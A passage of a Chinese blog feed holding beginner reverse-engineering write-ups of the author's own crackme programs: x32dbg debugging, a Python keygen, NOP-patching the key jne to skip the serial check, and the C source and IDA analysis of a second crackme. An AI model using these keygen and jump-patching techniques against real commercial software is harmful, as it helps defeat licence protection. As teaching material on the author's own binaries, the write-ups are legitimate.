&lt;p>不做更多介绍，汇编的分析已经进行过一次。这次我们找到对输入 &amp;ldquo;abc&amp;rdquo; 的正确序列号，完成一次解密。&lt;/p>
&lt;p>只需要在断点处点击&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-23.png"
loading="lazy"
alt="image-20210915141120060"
>按钮，然后观察&lt;code>eax&lt;/code>寄存器。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-24.png"
loading="lazy"
alt="image-20210915141405302"
>&lt;/p>
&lt;p>抄出来（居然不能右键复制后面的字符串），内容是&lt;code>4447467073727d7c&lt;/code>。&lt;/p>
&lt;p>接着继续运行，再把抄出来的答案复制进去看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-25.png"
loading="lazy"
alt="image-20210915141838395"
>&lt;/p>
&lt;p>到这里，我们拿到了一个可以用的序列号。&lt;/p>
&lt;h2 id="0x05-注册机">0x05 注册机&lt;/h2>
&lt;h3 id="51-python-脚本注册机">5.1 Python 脚本注册机&lt;/h3>
&lt;p>先把前面的伪代码贴一下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ebp-8h
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_ch -&amp;gt; ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 猜测的函数签名 func(void*, int, void*, int)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_10h -&amp;gt; ebp-10h
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_10h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^=&lt;/span> &lt;span class="mh">0x25&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">var_14h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x11&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_18h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x11&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_1ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_18h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%02x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_1ch&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">var_18h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x10&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">var_18h&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>里面的未知函数（失策，clang默认静态链接了libcmt，很多库函数在x32dbg里认不出来）猜一猜吧。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;username:&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">username_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bytearray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>
&lt;span class="c1"># 这里的未知函数通过调试器可以看出，把入参复制到了 var_8h 里&lt;/span>
&lt;span class="n">var_8h&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="n">username_len&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">username&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^=&lt;/span> &lt;span class="mh">0x25&lt;/span>
&lt;span class="c1"># for(int var_1ch = 0x0; var_1ch &amp;lt; 8; var_1ch++) {&lt;/span>
&lt;span class="c1"># unknown_func(var_18h + var_1ch * 2, &amp;#34;%02x&amp;#34;, var_8h[var_1ch]);&lt;/span>
&lt;span class="c1"># }&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 最后的那个循环中，函数判断为 sprintf 或其他啥，格式化明确是2位小写16进制数&lt;/span>
&lt;span class="c1"># 前面的计算看作是算偏移，一个 var_8h 的字节对应 2 字节16进制表示，所以 var_18h 加上 NUL 一共是 0x11 也就是 17 个字节&lt;/span>
&lt;span class="c1"># 循环的作用是把 var_8h 这个字节数组转换成16进制表示的字符串。&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 在 python 里用 hex() 就行了。&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hex&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行脚本，输入&lt;code>abc&lt;/code>，输出&lt;code>4447467073727d7c&lt;/code>，确认注册机可以生成序列号。&lt;/p>
&lt;h2 id="0x06-修改-exe">0x06 修改 exe&lt;/h2>
&lt;h3 id="61-x32dbg-修改关键跳">6.1 x32dbg 修改关键跳&lt;/h3>
&lt;p>用调试器打开后找到决定serial是否正确的关键跳转，右键二进制选择用NOP填充，确认即可。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-26.png"
loading="lazy"
alt="image-20210915150907420"
>&lt;/p>
&lt;p>修改后效果如图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-27.png"
loading="lazy"
alt="image-20210915150953046"
>&lt;/p>
&lt;p>接着把修改后的exe保存下来，在文件菜单里选择补丁。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-28.png"
loading="lazy"
alt="image-20210915151220354"
>&lt;/p>
&lt;p>全选，点修补文件，选择路径保存。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-29.png"
loading="lazy"
alt="image-20210915151322628"
>&lt;/p>
&lt;p>我保存在&lt;code>cm02-easy-patched.exe&lt;/code>，接着我们试试运行。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-30.png"
loading="lazy"
alt="image-20210915151903611"
>&lt;/p>
&lt;p>遗憾的是被x32dbg补丁功能导出的文件需要管理员权限运行，为了能截到图，图中用了名为&lt;code>sudo&lt;/code>的工具命令，可以用&lt;code>scoop install sudo&lt;/code>来安装&lt;code>sudo&lt;/code>，点击去&lt;a class="link" href="https://scoop.sh" target="_blank" rel="noopener"
>scoop首页&lt;/a>。&lt;/p>
&lt;h3 id="62-反编译器修改关键跳">6.2 反编译器修改关键跳&lt;/h3>
&lt;p>以Cutter为例，找到&lt;code>jne&lt;/code>指令后，右键修改为&lt;code>nop&lt;/code>即可。记得先备份。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-31.png"
loading="lazy"
alt="image-20210915152428449"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-32.png"
loading="lazy"
alt="image-20210915152609774"
>&lt;/p>
&lt;p>修改后也能实现和x32导出一样的效果，而且不用管理员权限。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>总得有个结论。&lt;/p>
&lt;p>这次逆向应该能帮助学到下面的东西：&lt;/p>
&lt;ul>
&lt;li>栈帧结构和函数调用&lt;/li>
&lt;li>&lt;code>cmp&lt;/code>指令&lt;/li>
&lt;li>&lt;code>jne&lt;/code>、&lt;code>jbe&lt;/code>、&lt;code>jnz&lt;/code>、&lt;code>jae&lt;/code>指令&lt;/li>
&lt;li>&lt;code>movsx&lt;/code>指令&lt;/li>
&lt;li>&lt;code>shl&lt;/code>指令&lt;/li>
&lt;/ul>
&lt;p>库函数因为静态链接的缘故已经变成了文中的未知函数，造成了分析上的障碍。老实说如果不是自己写的源码，能不能这么顺利逆向出注册机还真不好说。&lt;/p>
&lt;p>开启优化的 &lt;em>normal&lt;/em> 和 &lt;em>hard&lt;/em> 难度就不进一步分析了，有兴趣可以看看。&lt;/p></description></item><item><title>自娱自乐 CrackMe-1</title><link>https://nnnewb.github.io/blog/p/crackme-01/</link><pubDate>Fri, 10 Sep 2021 09:49:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/crackme-01/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>总之得有个前言。从前有个老和尚（不是，掉光了头发的攻城狮），&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>以上略，于是作为萌新含量110%的萌新，出于练手、熟悉下反汇编调试的环境之类的目的，还是自己写crackme来把玩吧。&lt;/p>
&lt;h2 id="cm01-介绍">CM01 介绍&lt;/h2>
&lt;p>于是这个 CrackMe 就叫 CM01 好了，命令行无界面。适合差不多对这些东西懂个大概或者打算学习的萌新：&lt;/p>
&lt;ul>
&lt;li>反汇编/调试工具&lt;/li>
&lt;li>寄存器（主要是 ebp、esp、eip、eax）&lt;/li>
&lt;li>函数调用（cdecl）&lt;/li>
&lt;li>栈/栈帧&lt;/li>
&lt;li>内存模型和寻址&lt;/li>
&lt;/ul>
&lt;h2 id="cm01-源码">CM01 源码&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="nf">getline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">lineptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lineptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">stream&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lineptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fgetc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">EOF&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">128&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">EOF&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">128&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">realloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;\n&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fgetc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">lineptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">p&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">bufptr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pwd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;secret&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">line&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">long&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">linesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;password:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">linesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">line&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">rc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strncmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">line&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pwd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">rc&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Good job!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;wrong pwd!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译工具链：&lt;/p>
&lt;ul>
&lt;li>因为VC++对单纯C的支持比较垃圾，所以用LLVM（Clang）-12.0.1，Clang&lt;/li>
&lt;/ul>
&lt;p>编译指令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">clang cm01.c -o cm01-easy.exe -m32 -O0
clang cm01.c -o cm01-normal.exe -m32 -O1
clang cm01.c -o cm01-hard.exe -m32 -O2
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="观察">观察&lt;/h2>
&lt;p>假装没看到源码，先观察下程序的行为，确定目标。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">weakptr in assembly-play ❯ .\cm01-easy.exe
password:password?
wrong pwd!
password:asdf
wrong pwd!
password:wrong pwd!
password:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个 &lt;em>password:&lt;/em> 提示符，随便输入了点什么会提示 &lt;em>wrong pwd!&lt;/em> 。&lt;/p>
&lt;p>确定目标是找出正确的密码。&lt;/p>
&lt;h2 id="静态分析">静态分析&lt;/h2>
&lt;h3 id="思路">思路&lt;/h3>
&lt;p>在逆向中有个说法叫*“关键跳转”*，如分析固定密码，字符串比较后跳转成功或跳转失败就是关键跳。对于简单的问题，找到关键跳即可破局。&lt;/p>
&lt;h3 id="反汇编---easy">反汇编 - Easy&lt;/h3>
&lt;p>Easy难度下，&lt;code>-O0&lt;/code>参数关闭了编译器优化，生成的汇编代码非常死板，基本能直接对照到C源码上。&lt;/p>
&lt;p>直接拿IDA打开。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-easy-1.png"
loading="lazy"
alt="image-20210912172521751"
>&lt;/p>
&lt;p>直接跳到了&lt;code>main&lt;/code>函数。接着看IDA汇编窗口中的的细节。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-easy-2.png"
loading="lazy"
alt="image-20210912173539972"
>&lt;/p>
&lt;p>IDA反汇编界面是包含一些伪代码的，有助于分析。&lt;/p>
&lt;p>左侧有长条和箭头的部分是控制流示意，箭头指的就是跳转方向。&lt;/p>
&lt;p>越过伪代码的部分，就能看到函数体开头例行公事的部分了。随后的便是函数体代码。&lt;/p>
&lt;p>具体看函数体前，先了解下IDA还提供了另一种控制流可视化的视图，可以极大帮助对函数逻辑的分析。&lt;/p>
&lt;p>在汇编视图里右键，选择 Graph View，即可进入控制流视图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-easy-3.png"
loading="lazy"
alt="image-20210912174233891"
>&lt;/p>
&lt;p>在图片左下角的是视图的全览，原本的汇编文本变成了图中箭头连接的小汇编代码块，箭头指示了跳转的方向。&lt;/p>
&lt;p>在这个视图可以很清楚地看到所谓的关键跳：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-easy-4.png"
loading="lazy"
alt="image-20210912174738919"
>&lt;/p>
&lt;p>&lt;code>_strncmp&lt;/code>是经过了 name mangling 的 c 标准库函数&lt;code>strncmp&lt;/code>，函数如名字所示，用途就是比较字符串。&lt;/p>
